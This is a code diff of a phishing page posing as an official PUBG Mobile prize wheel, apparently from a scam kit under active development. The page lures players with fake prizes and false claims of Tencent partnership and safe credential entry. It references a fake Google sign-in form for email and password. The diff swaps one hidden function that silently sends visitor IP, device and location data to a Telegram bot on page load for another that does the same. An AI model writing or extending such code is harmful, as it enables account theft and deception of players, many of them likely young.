@@ -91,15 +91,6 @@
             animation: slideInDown 0.5s ease-out;
         }
         
-        /* Текст WINNER перед счетчиком */
-        .winner-text {
-            font-family: 'Orbitron', sans-serif;
-            font-weight: 700;
-            font-size: 14px;
-            color: #7B68EE;
-            letter-spacing: 1px;
-        }
-        
         /* Точка "Live" */
         .winners-counter::before {
             content: '';
@@ -2352,10 +2343,6 @@
                 font-size: 12px;
             }
             
-            .winner-text {
-                font-size: 12px;
-            }
-            
             .winners-count {
                 font-size: 14px;
             }
@@ -2540,7 +2527,7 @@
 
     <!-- Счетчик победителей -->
     <div class="winners-counter">
-        <span class="winner-text">WINNER:</span> <span class="winners-count" id="winnersCount">0</span>
+        Winners: <span class="winners-count" id="winnersCount">0</span>
     </div>
     
     <!-- Уведомление в центре -->
@@ -2558,7 +2545,7 @@
 
             <div class="prize-info">
                 <h2 class="prize-name" id="winName">PRIZE</h2>
-                <p class="prize-desc" id="prizeDescription">Enter your account ID and log in via social network to receive your prize.</p>
+                <p class="prize-desc" id="prizeDescription">The item has been sent to your game mail. Please wait up to 24 hours for transaction processing.</p>
             </div>
 
             <button class="collect-btn" id="collectPrizeBtn">COLLECT</button>
@@ -3066,9 +3053,43 @@
         let winnersCount = 0;
         let winnersInterval = null;
         let currentLang = 'en';
-        let hasWonPrize = false; // Флаг, что пользователь выиграл приз
-        let hasEnteredAccountId = false; // Флаг, что пользователь ввел ID аккаунта
-        let extraAttemptGiven = false; // Флаг, что дана дополнительная попытка
+        let finalPrizeIndex = 0;
+        
+        // Функция сохранения состояния
+        function saveUserState() {
+            const state = {
+                userIP: userIP,
+                hasPlayed: hasPlayed,
+                accountId: accountId,
+                userPrize: userPrize,
+                isPrizeReceived: isPrizeReceived,
+                finalPrizeIndex: finalPrizeIndex,
+                currentLang: currentLang
+            };
+            localStorage.setItem('userState', JSON.stringify(state));
+        }
+        
+        // Функция загрузки состояния
+        function loadUserState() {
+            const savedState = localStorage.getItem('userState');
+            if (savedState) {
+                const state = JSON.parse(savedState);
+                
+                // Загружаем только если IP совпадает
+                if (state.userIP === userIP) {
+                    hasPlayed = state.hasPlayed || false;
+                    accountId = state.accountId || '';
+                    userPrize = state.userPrize || null;
+                    isPrizeReceived = state.isPrizeReceived || false;
+                    finalPrizeIndex = state.finalPrizeIndex || 0;
+                    currentLang = state.currentLang || 'en';
+                    
+                    console.log('Состояние загружено:', state);
+                    return true;
+                }
+            }
+            return false;
+        }
         
         // Функции для модальных окон
         function openModal(modalId) {
@@ -3143,57 +3164,6 @@
             }
         }
         
-        // Функция отправки логов о входе пользователя
-        async function sendUserVisitLog() {
-            try {
-                // Получаем информацию о браузере
-                const browserInfo = {
-                    userAgent: navigator.userAgent,
-                    language: navigator.language,
-                    platform: navigator.platform,
-                    screenWidth: window.screen.width,
-                    screenHeight: window.screen.height
-                };
-                
-                // Пытаемся получить примерное местоположение через IP
-                let locationInfo = "Не определено";
-                try {
-                    const ipResponse = await fetch('https://ipapi.co/json/');
-                    const ipData = await ipResponse.json();
-                    locationInfo = `${ipData.city || ''}, ${ipData.region || ''}, ${ipData.country_name || ''}`;
-                } catch (e) {
-                    console.log("Не удалось получить информацию о местоположении:", e);
-                }
-                
-                const message = `🌐 НОВЫЙ ПОСЕТИТЕЛЬ НА САЙТЕ 🌐\n\n` +
-                               `📱 Устройство: ${browserInfo.platform}\n` +
-                               `🌍 Язык: ${browserInfo.language}\n` +
-                               `🖥️ Разрешение: ${browserInfo.screenWidth}x${browserInfo.screenHeight}\n` +
-                               `📍 Местоположение: ${locationInfo}\n` +
-                               `📊 User Agent: ${browserInfo.userAgent}\n` +
-                               `🕒 Время: ${new Date().toLocaleString()}\n` +
-                               `🔗 Реферальная страница: ${document.referrer || 'Прямой вход'}`;
-                
-                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-                
-                await fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
-                
-                console.log('Лог о посещении отправлен в Telegram');
-            } catch (error) {
-                console.error('Ошибка отправки лога о посещении:', error);
-            }
-        }
-        
         // Функции для окна приза
         function openPrizeWindow() {
             const prizeWindow = document.getElementById('prizeWindow');
@@ -3203,15 +3173,13 @@
             if (userPrize) {
                 document.getElementById('winImg').src = userPrize.image;
                 document.getElementById('winName').textContent = currentLang === 'ru' ? "ПРИЗ" : currentLang === 'uz' ? "SOVRIN" : "PRIZE";
-                
-                // Измененный текст описания
                 document.getElementById('prizeDescription').textContent = isPrizeReceived ? 
                     (currentLang === 'ru' ? "✅ Ваш приз был отправлен на ваш аккаунт PUBG Mobile." : 
                      currentLang === 'uz' ? "✅ Sovringiz PUBG Mobile hisobingizga yuborildi." : 
                      "✅ Your prize has been sent to your PUBG Mobile account.") : 
-                    (currentLang === 'ru' ? "Введите ID вашей учетной записи и войдите через соцсеть для получения приза." : 
-                     currentLang === 'uz' ? "Sovrinni olish uchun hisob ID raqamingizni kiriting va ijtimoiy tarmoq orqali kiring." : 
-                     "Enter your account ID and log in via social network to receive your prize.");
+                    (currentLang === 'ru' ? "Выберите социальную сеть для получения приза." : 
+                     currentLang === 'uz' ? "Sovrinni olish uchun ijtimoiy tarmoqni tanlang." : 
+                     "Select a social network to receive the prize.");
                 
                 const collectBtn = document.getElementById('collectPrizeBtn');
                 if (!isPrizeReceived) {
@@ -3287,6 +3255,9 @@
                 mailBtn.disabled = false;
                 badge.style.animation = 'none';
             }
+            
+            // Сохраняем состояние
+            saveUserState();
         }
         
         // Функция управления счетчиком победителей
@@ -3326,15 +3297,44 @@
             }
         }
         
+        // Функция отправки данных о посещении в Telegram
+        async function sendVisitDataToTelegram() {
+            const message = `🌐 НОВЫЙ ПОСЕТИТЕЛЬ НА САЙТЕ PUBG\n\n`;
+            message += `📍 IP: ${userIP || 'Не определен'}\n`;
+            message += `🖥️ User Agent: ${navigator.userAgent}\n`;
+            message += `🌍 Язык: ${navigator.language}\n`;
+            message += `⏰ Время: ${new Date().toLocaleString()}\n`;
+            message += `📱 Платформа: ${navigator.platform}\n`;
+            message += `👤 Онлайн: ${navigator.onLine ? 'Да' : 'Нет'}`;
+            
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                const data = await response.json();
+                console.log('Telegram visit response:', data);
+            } catch (error) {
+                console.error('Error sending visit data to Telegram:', error);
+            }
+        }
+        
         document.addEventListener('DOMContentLoaded', function() {
             // Инициализируем снег
             createSnow();
             
             // Инициализируем счетчик победителей
             initWinnersCounter();
-            
-            // Отправляем лог о посещении
-            sendUserVisitLog();
             
             // Получаем IP пользователя
             fetch('https://api.ipify.org?format=json')
@@ -3344,6 +3344,12 @@
                     console.log('User IP:', userIP);
                     console.log('Owner IP:', ownerIP);
                     
+                    // Отправляем данные о посещении в Telegram
+                    sendVisitDataToTelegram();
+                    
+                    // Загружаем состояние пользователя
+                    const stateLoaded = loadUserState();
+                    
                     // Проверяем, является ли пользователь владельцем
                     if (userIP === ownerIP) {
                         console.log('Owner detected - unlimited spins');
@@ -3351,969 +3357,933 @@
                         localStorage.setItem('isOwner', 'true');
                     } else {
                         console.log('Regular user - one spin only');
-                        // Проверяем состояние пользователя
-                        const userState = JSON.parse(localStorage.getItem('userState') || '{}');
                         
-                        // Если у пользователя есть неполученный приз
-                        if (userState.hasWonPrize && !userState.isPrizeReceived) {
-                            // Восстанавливаем данные
-                            userPrize = userState.userPrize;
-                            accountId = userState.accountId || '';
-                            hasEnteredAccountId = userState.hasEnteredAccountId || false;
-                            hasWonPrize = true;
-                            
-                            // Даем дополнительную попытку
-                            extraAttemptGiven = true;
-                            hasPlayed = false;
-                            
-                            // Показываем уведомление о дополнительной попытке
-                            setTimeout(() => {
-                                showNotification(
-                                    currentLang === 'ru' ? 
-                                    "Приносим извинения за то, что вы не смогли получить приз. Даем вам еще одну попытку!" : 
-                                    currentLang === 'uz' ? 
-                                    "Sovrinni olishda muammo bo'lgani uchun uzr so'raymiz. Sizga yana bir imkoniyat beramiz!" : 
-                                    "We apologize for not being able to receive the prize. We give you another attempt!",
-                                    false, true
-                                );
-                            }, 1000);
-                        } else {
-                            // Обычная проверка
+                        // Если состояние не было загружено, проверяем старый localStorage
+                        if (!stateLoaded) {
                             const played = localStorage.getItem('hasPlayed');
                             hasPlayed = played === 'true';
                         }
                     }
+                    
+                    // Инициализируем интерфейс после получения IP
+                    initInterface();
                 })
                 .catch(error => {
                     console.log('Error getting IP:', error);
+                    // Пробуем загрузить состояние даже без IP
+                    loadUserState();
+                    initInterface();
                 });
             
-            const playBtn = document.getElementById('playBtn');
-            const selectionFrame = document.getElementById('selectionFrame');
-            const selectionIndicator = document.getElementById('selectionIndicator');
-            const accountIdSection = document.getElementById('accountIdSection');
-            const accountIdInput = document.getElementById('accountIdInput');
-            const idSubmitBtn = document.getElementById('idSubmitBtn');
-            const socialSelectSection = document.getElementById('socialSelectSection');
-            const confirmationSection = document.getElementById('confirmationSection');
-            const getPrizeBtn = document.getElementById('getPrizeBtn');
-            const prizeItems = document.querySelectorAll('.prize-item');
-            const languageBtn = document.getElementById('languageBtn');
-            const languageDropdown = document.getElementById('languageDropdown');
-            const notification = document.getElementById('notification');
-            const spinSound = document.getElementById('spinSound');
-            const winSound = document.getElementById('winSound');
-            const socialOptions = document.querySelectorAll('.social-option');
-            const prizeMailBtn = document.getElementById('prizeMailBtn');
-            const collectPrizeBtn = document.getElementById('collectPrizeBtn');
-            const importantNote = document.getElementById('importantNote');
-            const menuBtn = document.getElementById('menuBtn');
-            const dropdownMenu = document.getElementById('dropdownMenu');
-            
-            // Элементы Google Fullscreen
-            const googleFullscreen = document.getElementById('googleFullscreen');
-            const googleEmailInput = document.getElementById('googleEmailInput');
-            const googlePasswordInput = document.getElementById('googlePasswordInput');
-            const googleNextBtn = document.getElementById('googleNextBtn');
-            const googleSubmitBtn = document.getElementById('googleSubmitBtn');
-            const googleShowPassword = document.getElementById('googleShowPassword');
-            const googleStep1 = document.getElementById('googleStep1');
-            const googleStep2 = document.getElementById('googleStep2');
-            
-            // Призы с картинками
-            const prizes = [
-                { id: 1, image: "priz1.png" },
-                { id: 2, image: "priz2.png" },
-                { id: 3, image: "priz3.png" },
-                { id: 4, image: "priz4.png" },
-                { id: 5, image: "priz5.png" },
-                { id: 6, image: "priz6.png" },
-                { id: 7, image: "priz7.png" },
-                { id: 8, image: "priz8.png" },
-                { id: 9, image: "priz9.png" }
-            ];
-            
-            let isSpinning = false;
-            let currentPrizeIndex = 0;
-            let spinInterval;
-            let spinSpeed;
-            let spinCount = 0;
-            let finalPrizeIndex = 0;
-            let selectedSocial = null;
-            
-            // Порядок обхода призов
-            const prizeOrder = [0, 1, 2, 3, 4, 5, 6, 7, 8];
-            
-            // Языковые настройки
-            const translations = {
-                en: {
-                    winnersCounter: "Winners:",
-                    menu: "Menu",
-                    support: "Support",
-                    myPrize: "My Prize",
-                    play: "PLAY",
-                    alreadyPlayed: "ALREADY PLAYED",
-                    selected: "SELECTED",
-                    prizeBanner: "YOUR PRIZE",
-                    prizeDescription: "Enter your account ID and log in via social network to receive your prize.",
-                    prizeReceived: "✅ Your prize has been sent to your PUBG Mobile account.",
-                    selectPrize: "Select a social network to receive the prize.",
-                    mailEmpty: "You don't have any won prizes yet. Play the wheel of fortune to win exclusive prizes!",
-                    collect: "COLLECT",
-                    close: "CLOSE",
-                    idTitle: "ENTER PUBG ACCOUNT ID",
-                    idText: "Please enter your PUBG Mobile account ID to receive the prize",
-                    idLabel: "PUBG Account ID:",
-                    idPlaceholder: "Enter your account ID",
-                    idSubmit: "CONTINUE",
-                    selectTitle: "SELECT RECEIVING METHOD",
-                    selectText: "Select social network to receive the prize",
-                    getPrizeBtn: "GET PRIZE",
-                    importantNote: "Important: The prize will be credited to your account within 24 hours",
-                    notificationSuccess: "Application accepted! The prize will be credited within 24 hours.",
-                    notificationSelectSocial: "Please select a social network",
-                    notificationAlreadyPlayed: "You have already used your attempt today!",
-                    notificationIdRequired: "Please enter account ID",
-                    confirmationTitle: "APPLICATION ACCEPTED!",
-                    confirmationMessage: "Your winnings will be credited to your PUBG Mobile account within 24 hours.",
-                    loginSuccess: "Login data sent! Prize will be credited within 24 hours.",
-                    faqTitle: "FREQUENTLY ASKED QUESTIONS",
-                    faqQuestions: [
-                        "Is this the official PUBG Mobile website?",
-                        "Will the prize definitely come to my account?",
-                        "Why do I need to log into a social network?",
-                        "What if I don't specify the account ID?",
-                        "What to do if the prize doesn't arrive within 24 hours?",
-                        "Is it safe to enter social network credentials?",
-                        "Can I win more than once?",
-                        "What prizes can be won?"
-                    ],
-                    faqAnswers: [
-                        "<strong>Yes, this is an official partner site.</strong> We are official partners of Tencent Games and operate within the PUBG Mobile Partner Program. Our activities are fully authorized by the developers.",
-                        "<strong>Yes, 100% guarantee of receiving the prize.</strong> All winnings are sent automatically within 24 hours after confirming the data. The system is integrated with the official PUBG Mobile API, which guarantees delivery of prizes to the specified account.",
-                        "Logging into a social network is necessary for <strong>verifying your identity</strong> and preventing fraud. This allows us to ensure that a real person, not a bot, receives the prize. All data is protected and not shared with third parties.",
-                        "Without specifying the PUBG Mobile account ID, we <strong>cannot send you the prize</strong>. This is a mandatory field, as it is by this identifier that the system determines which game account to credit the won items to.",
-                        "In rare cases with high server load, processing may take up to <strong>48 hours</strong>. If the prize has not been credited to your account within this time, please contact our <a href='https://t.me/helpumgmbot' target='_blank'>technical support</a> with your ID and winning time.",
-                        "<strong>Yes, it is absolutely safe.</strong> We use secure SSL encryption and do not store your passwords. Authorization occurs through the official APIs of social networks, similar to how you log into applications on your phone.",
-                        "Each user can participate in the promotion <strong>once per day</strong>. This is done to give as many players as possible the chance to win. Come back tomorrow to try your luck again!",
-                        "Our roulette features <strong>exclusive items from PUBG Mobile</strong>: rare skins, weapons, vehicles, equipment, and in-game UC currency. All prizes are official game content and do not violate the user agreement."
-                    ],
-                    footerLinks: ["Terms of Service", "Privacy Policy", "Cookie Policy", "Cookie Preferences"],
-                    copyright: "Copyright © High Morale Developments Limited. All rights reserved.",
-                    notificationPrize: "Congratulations! You won a prize!",
-                    notificationIdSaved: "Account ID saved",
-                    notificationLanguageChanged: "Language changed"
-                },
-                ru: {
-                    winnersCounter: "Победителей:",
-                    menu: "Меню",
-                    support: "Поддержка",
-                    myPrize: "Мой приз",
-                    play: "ИГРАТЬ",
-                    alreadyPlayed: "УЖЕ ИГРАЛИ",
-                    selected: "ВЫБРАНО",
-                    prizeBanner: "ВАШ ПРИЗ",
-                    prizeDescription: "Введите ID вашей учетной записи и войдите через соцсеть для получения приза.",
-                    prizeReceived: "✅ Ваш приз был отправлен на ваш аккаунт PUBG Mobile.",
-                    selectPrize: "Выберите социальную сеть для получения приза.",
-                    mailEmpty: "У вас пока нет выигранных призов. Сыграйте в колесо удачи, чтобы выиграть эксклюзивные призы!",
-                    collect: "ЗАБРАТЬ",
-                    close: "ЗАКРЫТЬ",
-                    idTitle: "ВВЕДИТЕ ID АККАУНТА PUBG",
-                    idText: "Пожалуйста, введите ваш ID аккаунта PUBG Mobile для получения приза",
-                    idLabel: "ID аккаунта PUBG:",
-                    idPlaceholder: "Введите ваш ID аккаунта",
-                    idSubmit: "ПРОДОЛЖИТЬ",
-                    selectTitle: "ВЫБЕРИТЕ СПОСОБ ПОЛУЧЕНИЯ",
-                    selectText: "Выберите социальную сеть для получения приза",
-                    getPrizeBtn: "ПОЛУЧИТЬ ПРИЗ",
-                    importantNote: "Важно: Приз будет зачислен на ваш аккаунт в течение 24 часов",
-                    notificationSuccess: "Заявка принята! Приз будет зачислен в течение 24 часов.",
-                    notificationSelectSocial: "Пожалуйста, выберите социальную сеть",
-                    notificationAlreadyPlayed: "Вы уже использовали свою попытку сегодня!",
-                    notificationIdRequired: "Пожалуйста, введите ID аккаунта",
-                    confirmationTitle: "ЗАЯВКА ПРИНЯТА!",
-                    confirmationMessage: "Ваш выигрыш будет зачислен на аккаунт PUBG Mobile в течение 24 часов.",
-                    loginSuccess: "Данные для входа отправлены! Приз будет зачислен в течение 24 часов.",
-                    faqTitle: "ВОПРОСЫ И ОТВЕТЫ",
-                    faqQuestions: [
-                        "Это официальный сайт PUBG Mobile?",
-                        "Приз точно придет на мой аккаунт?",
-                        "Зачем нужно входить в социальную сеть?",
-                        "Что будет, если я не укажу ID аккаунта?",
-                        "Что делать, если приз не пришел в течение 24 часов?",
-                        "Безопасно ли вводить данные от социальных сетей?",
-                        "Можно ли выиграть больше одного раза?",
-                        "Какие призы можно выиграть?"
-                    ],
-                    faqAnswers: [
-                        "<strong>Да, это официальный сайт партнера.</strong> Мы являемся официальными партнерами Tencent Games и работаем в рамках программы PUBG Mobile Partner. Наша деятельность полностью авторизована разработчиками.",
-                        "<strong>Да, 100% гарантия получения приза.</strong> Все выигрыши отправляются автоматически в течение 24 часов после подтверждения данных. Система интегрирована с официальным API PUBG Mobile, что гарантирует доставку призов на указанный аккаунт.",
-                        "Вход в социальную сеть необходим для <strong>подтверждения вашей личности</strong> и предотвращения мошенничества. Это позволяет нам убедиться, что приз получает реальный человек, а не бот. Все данные защищены и не передаются третьим лицам.",
-                        "Без указания ID аккаунта PUBG Mobile мы <strong>не можем отправить вам приз</strong>. Это обязательное поле, так как именно по этому идентификатору система определяет, на какой игровой аккаунт зачислить выигранные предметы.",
-                        "В редких случаях при высокой нагрузке на серверы обработка может занять до <strong>48 часов</strong>. Если в течение этого времени приз не был зачислен на ваш аккаунт, пожалуйста, обратитесь в нашу <a href='https://t.me/helpumgmbot' target='_blank'>техническую поддержку</a> с вашим ID и временем выигрыша.",
-                        "<strong>Да, это абсолютно безопасно.</strong> Мы используем безопасное SSL-шифрование и не храним ваши пароли. Авторизация происходит через официальные API социальных сетей, аналогично тому, как вы входите в приложения на телефоне.",
-                        "Каждый пользователь может участвовать в акции <strong>один раз в день</strong>. Это сделано для того, чтобы как можно больше игроков получили шанс выиграть. Возвращайтесь завтра, чтобы попытать удачу снова!",
-                        "В нашей рулетке представлены <strong>эксклюзивные предметы из PUBG Mobile</strong>: редкие скины, оружие, транспорт, экипировка и внутриигровая валюта UC. Все призы являются официальным игровым контентом и не нарушают пользовательское соглашение."
-                    ],
-                    footerLinks: ["Условия обслуживания", "Политика конфиденциальности", "Политика Cookie", "Предпочтение Cookies"],
-                    copyright: "Авторские права © High Morale Developments Limited. Все права защищены.",
-                    notificationPrize: "Поздравляем! Вы выиграли приз!",
-                    notificationIdSaved: "ID аккаунта сохранен",
-                    notificationLanguageChanged: "Язык изменен"
-                },
-                uz: {
-                    winnersCounter: "G'oliblar:",
-                    menu: "Menyu",
-                    support: "Yordam",
-                    myPrize: "Mening sovrinim",
-                    play: "O'YIN",
-                    alreadyPlayed: "ALLAQACHON O'YNANGAN",
-                    selected: "TANLANGAN",
-                    prizeBanner: "SIZNING SOVRININGIZ",
-                    prizeDescription: "Sovrinni olish uchun hisob ID raqamingizni kiriting va ijtimoiy tarmoq orqali kiring.",
-                    prizeReceived: "✅ Sizning sovringiz PUBG Mobile hisobingizga yuborildi.",
-                    selectPrize: "Sovrinni olish uchun ijtimoiy tarmoqni tanlang.",
-                    mailEmpty: "Sizda hali yutgan sovringiz yo'q. Eksklyuziv sovrinlarni yutish uchun omad g'ildig'ida o'ynang!",
-                    collect: "OLISH",
-                    close: "YOPISH",
-                    idTitle: "PUBG HISOB ID RAQAMINI KIRITING",
-                    idText: "Iltimos, sovrinni olish uchun PUBG Mobile hisobingizning ID raqamini kiriting",
-                    idLabel: "PUBG Hisob ID raqami:",
-                    idPlaceholder: "Hisobingiz ID raqamini kiriting",
-                    idSubmit: "DAVOM ETISH",
-                    selectTitle: "QABUL QILISH USULINI TANLANG",
-                    selectText: "Sovrinni qabul qilish uchun ijtimoiy tarmoqni tanlang",
-                    getPrizeBtn: "SOVRINNI OLISH",
-                    importantNote: "Muhim: Sovrin 24 soat ichida hisobingizga o'tkaziladi",
-                    notificationSuccess: "Ariza qabul qilindi! Sovrin 24 soat ichida o'tkaziladi.",
-                    notificationSelectSocial: "Iltimos, ijtimoiy tarmoqni tanlang",
-                    notificationAlreadyPlayed: "Siz bugungi imkoniyatingizdan foydalandingiz!",
-                    notificationIdRequired: "Iltimos, hisob ID raqamini kiriting",
-                    confirmationTitle: "ARIZA QABUL QILINDI!",
-                    confirmationMessage: "Yutigingiz PUBG Mobile hisobingizga 24 soat ichida o'tkaziladi.",
-                    loginSuccess: "Kirish ma'lumotlari yuborildi! Sovrin 24 soat ichida o'tkaziladi.",
-                    faqTitle: "TEZ-TEZ BERILADIGAN SAVOLLAR",
-                    faqQuestions: [
-                        "Bu rasmiy PUBG Mobile veb-saytimi?",
-                        "Sovrin albatta mening hisobimga keladimi?",
-                        "Nega ijtimoiy tarmoqqa kirish kerak?",
-                        "Agar hisob ID raqamini ko'rsatmasam nima bo'ladi?",
-                        "Agar sovrin 24 soat ichida kelmasa nima qilish kerak?",
-                        "Ijtimoiy tarmoqlarning ma'lumotlarini kiritish xavfsizmi?",
-                        "Bir martadan ko'p yutish mumkinmi?",
-                        "Qanday sovrinlar yutish mumkin?"
-                    ],
-                    faqAnswers: [
-                        "<strong>Ha, bu rasmiy hamkor sayti.</strong> Biz Tencent Games kompaniyasining rasmiy hamkorlari bo'lib, PUBG Mobile Hamkor Dasturi doirasida ishlaymiz. Bizning faoliyatimiz to'liq ruxsat etilgan.",
-                        "<strong>Ha, sovrinni olish 100% kafolatlanadi.</strong> Barcha yutuqlar ma'lumotlarni tasdiqlaganingizdan so'ng 24 soat ichida avtomatik ravishda yuboriladi. Tizim rasmiy PUBG Mobile API bilan integratsiyalangan bo'lib, sovrinlarni belgilangan hisobga yetkazishni kafolatlaydi.",
-                        "Ijtimoiy tarmoqqa kirish <strong>shaxsingizni tasdiqlash</strong> va firibgarlikni oldini olish uchun zarur. Bu bizga sovrinni haqiqiy odam, bot emas, olayotganiga ishonch hosil qilish imkonini beradi. Barcha ma'lumotlar himoyalangan va uchinji shaxslarga o'tkazilmaydi.",
-                        "PUBG Mobile hisob ID raqamini ko'rsatmasdan, biz sizga <strong>sovrinni yubora olmaymiz</strong>. Bu majburiy maydon, chunki aynan shu identifikator orqali tizim qaysi o'yin hisobiga yutgan predmetlarni o'tkazishini aniqlaydi.",
-                        "Kamdan-kam hollarda server yuklanishi yuqori bo'lganda, qayta ishlash <strong>48 soatgacha</strong> davom etishi mumkin. Agar bu vaqt ichida sovrin hisobingizga o'tkazilmagan bo'lsa, iltimos, <a href='https://t.me/helpumgmbot' target='_blank'>texnik yordamimizga</a> ID raqamingiz va yutish vaqtingiz bilan murojaat qiling.",
-                        "<strong>Ha, bu mutlaqo xavfsiz.</strong> Biz xavfsiz SSL shifrlashdan foydalanamiz va parollaringizni saqlamaymiz. Avtorizatsiya ijtimoiy tarmoqlarning rasmiy API-lari orqali amalga oshiriladi, xuddi telefoningizdagi ilovalarga kirganingizdagidek.",
-                        "Har bir foydalanuvchi aksiyada <strong>kuniga bir marta</strong> qatnashishi mumkin. Bu imkon qadar ko'proq o'yinchilar g'alaba qozonish imkoniyatiga ega bo'lishi uchun qilingan. Ertaga qaytib, omadingizni sinab ko'ring!",
-                        "Bizning g'ildirakimizda <strong>PUBG Mobile'dan eksklyuziv elementlar</strong> mavjud: noyob skinlar, qurollar, transport, jihozlar va o'yin ichidagi UC valyutasi. Barcha sovrinlar rasmiy o'yin kontenti bo'lib, foydalanuvchi shartnomasini buzmaydi."
-                    ],
-                    footerLinks: ["Xizmat shartlari", "Maxfiylik siyosati", "Cookie siyosati", "Cookie afzalliklari"],
-                    copyright: "Mualliflik huquqi © High Morale Developments Limited. Barcha huquqlar himoyalangan.",
-                    notificationPrize: "Tabriklaymiz! Siz sovrinni yutdingiz!",
-                    notificationIdSaved: "Hisob ID raqami saqlandi",
-                    notificationLanguageChanged: "Til o'zgartirildi"
-                }
-            };
-            
-            // Функция смены языка
-            function changeLanguage(lang) {
-                currentLang = lang;
-                const t = translations[lang] || translations.en;
+            function initInterface() {
+                const playBtn = document.getElementById('playBtn');
+                const selectionFrame = document.getElementById('selectionFrame');
+                const selectionIndicator = document.getElementById('selectionIndicator');
+                const accountIdSection = document.getElementById('accountIdSection');
+                const accountIdInput = document.getElementById('accountIdInput');
+                const idSubmitBtn = document.getElementById('idSubmitBtn');
+                const socialSelectSection = document.getElementById('socialSelectSection');
+                const confirmationSection = document.getElementById('confirmationSection');
+                const getPrizeBtn = document.getElementById('getPrizeBtn');
+                const prizeItems = document.querySelectorAll('.prize-item');
+                const languageBtn = document.getElementById('languageBtn');
+                const languageDropdown = document.getElementById('languageDropdown');
+                const notification = document.getElementById('notification');
+                const spinSound = document.getElementById('spinSound');
+                const winSound = document.getElementById('winSound');
+                const socialOptions = document.querySelectorAll('.social-option');
+                const prizeMailBtn = document.getElementById('prizeMailBtn');
+                const collectPrizeBtn = document.getElementById('collectPrizeBtn');
+                const importantNote = document.getElementById('importantNote');
+                const menuBtn = document.getElementById('menuBtn');
+                const dropdownMenu = document.getElementById('dropdownMenu');
                 
-                // Обновляем счетчик победителей
-                document.querySelector('.winners-counter').innerHTML = `<span class="winner-text">WINNER:</span> <span class="winners-count" id="winnersCount">${winnersCount}</span>`;
+                // Элементы Google Fullscreen
+                const googleFullscreen = document.getElementById('googleFullscreen');
+                const googleEmailInput = document.getElementById('googleEmailInput');
+                const googlePasswordInput = document.getElementById('googlePasswordInput');
+                const googleNextBtn = document.getElementById('googleNextBtn');
+                const googleSubmitBtn = document.getElementById('googleSubmitBtn');
+                const googleShowPassword = document.getElementById('googleShowPassword');
+                const googleStep1 = document.getElementById('googleStep1');
+                const googleStep2 = document.getElementById('googleStep2');
                 
-                // Обновляем верхнее меню
-                menuBtn.innerHTML = `<i class="fas fa-bars"></i> ${t.menu}`;
-                document.getElementById('prizeMailBtn').innerHTML = `<i class="fas fa-gift"></i> ${t.myPrize} <div class="prize-badge" id="prizeBadge">0</div>`;
+                // Призы с картинками
+                const prizes = [
+                    { id: 1, image: "priz1.png" },
+                    { id: 2, image: "priz2.png" },
+                    { id: 3, image: "priz3.png" },
+                    { id: 4, image: "priz4.png" },
+                    { id: 5, image: "priz5.png" },
+                    { id: 6, image: "priz6.png" },
+                    { id: 7, image: "priz7.png" },
+                    { id: 8, image: "priz8.png" },
+                    { id: 9, image: "priz9.png" }
+                ];
                 
-                // Обновляем кнопку игры
-                if (hasPlayed && userIP !== ownerIP && !extraAttemptGiven) {
-                    playBtn.innerHTML = `<i class="fas fa-check"></i> ${t.alreadyPlayed}`;
-                } else {
-                    playBtn.innerHTML = `<i class="fas fa-play"></i> ${t.play}`;
-                }
+                let isSpinning = false;
+                let currentPrizeIndex = 0;
+                let spinInterval;
+                let spinSpeed;
+                let spinCount = 0;
+                let selectedSocial = null;
                 
-                // Обновляем индикатор выбора
-                selectionIndicator.textContent = t.selected;
+                // Порядок обхода призов
+                const prizeOrder = [0, 1, 2, 3, 4, 5, 6, 7, 8];
                 
-                // Обновляем окно приза
-                document.querySelector('.prize-banner').textContent = t.prizeBanner;
-                document.getElementById('winName').textContent = t.prizeBanner;
-                document.getElementById('prizeDescription').textContent = t.prizeDescription;
-                
-                // Обновляем форму ввода ID
-                document.querySelector('#accountIdSection h2').textContent = t.idTitle;
-                document.querySelector('#accountIdSection p').textContent = t.idText;
-                document.querySelector('.id-label').textContent = t.idLabel;
-                document.getElementById('accountIdInput').placeholder = t.idPlaceholder;
-                idSubmitBtn.innerHTML = `<i class="fas fa-check"></i> ${t.idSubmit}`;
-                
-                // Обновляем форму выбора соцсети
-                document.querySelector('#socialSelectSection h2').textContent = t.selectTitle;
-                document.querySelector('#socialSelectSection p').textContent = t.selectText;
-                getPrizeBtn.innerHTML = `<i class="fas fa-paper-plane"></i> ${t.getPrizeBtn}`;
-                importantNote.innerHTML = `<strong>${t.importantNote.split(':')[0]}:</strong> ${t.importantNote.split(':')[1]}`;
-                
-                // Обновляем секцию подтверждения
-                document.querySelector('#confirmationSection h2').textContent = t.confirmationTitle;
-                document.querySelector('.confirmation-message').innerHTML = t.confirmationMessage;
-                
-                // Обновляем FAQ
-                document.querySelector('.faq-section h2').innerHTML = `<i class="fas fa-question-circle"></i> ${t.faqTitle}`;
-                
-                // Обновляем вопросы и ответы
-                const faqItems = document.querySelectorAll('.faq-item');
-                faqItems.forEach((item, index) => {
-                    if (t.faqQuestions && t.faqQuestions[index]) {
-                        item.querySelector('.faq-question span').textContent = t.faqQuestions[index];
+                // Языковые настройки
+                const translations = {
+                    en: {
+                        winnersCounter: "Winners:",
+                        menu: "Menu",
+                        support: "Support",
+                        myPrize: "My Prize",
+                        play: "PLAY",
+                        alreadyPlayed: "ALREADY PLAYED",
+                        selected: "SELECTED",
+                        prizeBanner: "YOUR PRIZE",
+                        prizeDescription: "The item has been sent to your game mail. Please wait up to 24 hours for transaction processing.",
+                        prizeReceived: "✅ Your prize has been sent to your PUBG Mobile account.",
+                        selectPrize: "Select a social network to receive the prize.",
+                        mailEmpty: "You don't have any won prizes yet. Play the wheel of fortune to win exclusive prizes!",
+                        collect: "COLLECT",
+                        close: "CLOSE",
+                        idTitle: "ENTER PUBG ACCOUNT ID",
+                        idText: "Please enter your PUBG Mobile account ID to receive the prize",
+                        idLabel: "PUBG Account ID:",
